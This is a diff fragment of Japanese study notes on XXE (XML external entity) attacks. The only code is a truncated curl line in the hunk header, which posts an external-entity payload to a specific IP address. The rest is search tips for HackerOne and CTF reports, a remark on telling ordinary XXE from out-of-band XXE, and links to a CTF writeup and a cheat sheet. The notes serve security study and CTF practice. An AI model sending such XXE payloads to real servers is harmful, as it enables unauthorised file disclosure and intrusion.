@@ -439,7 +439,9 @@ curl "http://68.183.31.62:94/custom" -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "htt
 `hackerone report xxe`とかでググるといろいろ出てくる。   
 `xxe ctf`,`xxe vulnhub`,`xxe hackthebox`とか。   
 応答が返ってくるかで、普通のXXEかOOB XXEかが判別できそう。   
-
+  
+https://balsn.tw/ctf_writeup/20181130-pwn2winctf/#berg%E2%80%99s-club  
+writeup todo  
 # 参考
 https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xxe.md   
 チートシート   
